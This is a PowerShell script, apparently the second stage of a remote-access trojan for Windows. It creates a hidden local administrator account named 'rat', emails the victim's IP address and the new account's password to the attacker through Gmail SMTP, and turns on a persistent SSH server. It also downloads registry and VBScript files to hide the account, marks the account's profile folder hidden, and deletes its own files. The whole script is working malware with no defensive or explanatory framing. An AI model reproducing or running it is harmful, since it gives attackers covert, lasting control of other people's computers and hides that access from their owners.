# random string for direcories
function random_string {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

# create local admin
function create_user {
    [CmdletBinding()]
    param (
        [string] $username,
        [securestring] $password
    )    
    begin {
    }    
    process {
        New-LocalUser "$username" -Password $password -FullName "$username" -Description "Temporary local admin"
        Write-Verbose "$username local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$username"
        Write-Verbose "$username added to the local administrator group"
    }    
    end {
    }
}

# create local admin
Remove-LocalUser -Name "rat" # in case already exists
$username = "rat"
$pass_gen_string = random_string
$password = (ConvertTo-SecureString $pass_gen_string -AsPlainText -Force)
create_user -username $username -password $password

# varaibles
$temp_folder = random_string
$temp_folder_path = "$env:temp\$temp_folder"
$current_dir = Get-Location
$user_name = "$env:UserName.rat"
$your_email = Get-Content email.txt
$email_password = Get-Content password.txt
$target_ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress

# writes config file
Add-Content -Path $user_name -Value $target_ip
Add-Content -Path $user_name -Value $pass_gen_string
Add-Content -Path $user_name -Value $temp_folder_path

# smtp process
Send-MailMessage -From $your_email -To $your_email -Subject $user_name -Attachment $user_name -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $your_email, (ConvertTo-SecureString -String $email_password -AsPlainText -Force))

# goto temp, make working directory
mkdir $temp_folder_path
Set-Location $temp_folder_path

# enabling persistent ssh
# to do: check for ssh first?
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# registry to hide local admin
$reg_string = random_string
Invoke-WebRequest -Uri hide-user.reg -OutFile "$reg_string.reg"

# visual basic script to register the registry
$vb_string = random_string
Invoke-WebRequest -Uri confirm-reg.vbs -OutFile "$vb_string.vbs"

# install the registry
Invoke-Expression "./$reg_string.reg"; Invoke-Expression "./$vb_string.vbs"

# hide rat user
Set-Location C:\Users
attrib +h +s +r rat

# self delete
Set-Location $current_dir
Remove-Item $user_name
Remove-Item email.txt
Remove-Item password.txt
Remove-Item stage2.ps1